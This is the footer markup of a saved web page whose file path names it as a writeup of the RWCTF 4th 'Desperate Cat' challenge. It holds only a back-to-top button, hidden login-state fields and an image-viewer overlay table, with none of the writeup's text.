    <div class="back-to-top" onclick="$(&quot;html,body&quot;).animate({scrollTop:0}, 500);" style="position: fixed;bottom:40px;right: 20px;height: 40px;width: 40px;background-color: #1dada7;border-radius: 50%;text-align: center;cursor: pointer">
        <img src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/t0179ac3294ef926b8c.png" style="width:30px;margin-top: 6px;">
    </div>
    <div id="dynamicScript">
    </div>

</footer>

<div id="localValue"><input id="user-info-cached" type="hidden" value="true"><input id="isLogin" type="hidden" value="false"></div><div class="highslide-container" style="padding: 0px; border: none; margin: 0px; position: absolute; left: 0px; top: 0px; width: 100%; z-index: 1001; direction: ltr;"><a class="highslide-loading" title="Click to cancel" href="javascript:;" style="position: absolute; top: -9999px; opacity: 0.75; z-index: 1;">Loading...</a><div style="display: none;"></div><div class="highslide-viewport highslide-viewport-size" style="padding: 0px; border: none; margin: 0px; visibility: hidden;"></div><table cellspacing="0" style="padding: 0px; border: none; margin: 0px; visibility: hidden; position: absolute; border-collapse: collapse; width: 0px;"><tbody style="padding: 0px; border: none; margin: 0px;"><tr style="padding: 0px; border: none; margin: 0px; height: auto;"><td style="padding: 0px; border: none; margin: 0px; line-height: 0; font-size: 0px; background: url(&quot;https://static.anquanke.com/highslide/outlines/rounded-white.png&quot;) 0px 0px; height: 20px; width: 20px;"></td><td style="padding: 0px; border: none; margin: 0px; line-height: 0; font-size: 0px; background: url(&quot;https://static.anquanke.com/highslide/outlines/rounded-white.png&quot;) 0px -40px; height: 20px; width: 20px;"></td><td style="padding: 0px; border: none; margin: 0px; line-height: 0; font-size: 0px; background: url(&quot;https://static.anquanke.com/highslide/outlines/rounded-white.png&quot;) -20px 0px; height: 20px; width: 20px;"></td></tr><tr style="padding: 0px; border: none; margin: 0px; height: auto;"><td style="padding: 0px; border: none; margin: 0px; line-height: 0; font-size: 0px; background: url(&quot;https://static.anquanke.com/highslide/outlines/rounded-white.png&quot;) 0px -80px; height: 20px; width: 20px;"></td><td class="rounded-white highslide-outline" style="padding: 0px; border: none; margin: 0px; position: relative;"></td><td style="padding: 0px; border: none; margin: 0px; line-height: 0; font-size: 0px; background: url(&quot;https://static.anquanke.com/highslide/outlines/rounded-white.png&quot;) -20px -80px; height: 20px; width: 20px;"></td></tr><tr style="padding: 0px; border: none; margin: 0px; height: auto;"><td style="padding: 0px; border: none; margin: 0px; line-height: 0; font-size: 0px; background: url(&quot;https://static.anquanke.com/highslide/outlines/rounded-white.png&quot;) 0px -20px; height: 20px; width: 20px;"></td><td style="padding: 0px; border: none; margin: 0px; line-height: 0; font-size: 0px; background: url(&quot;https://static.anquanke.com/highslide/outlines/rounded-white.png&quot;) 0px -60px; height: 20px; width: 20px;"></td><td style="padding: 0px; border: none; margin: 0px; line-height: 0; font-size: 0px; background: url(&quot;https://static.anquanke.com/highslide/outlines/rounded-white.png&quot;) -20px -20px; height: 20px; width: 20px;"></td></tr></tbody></table></div></body></html>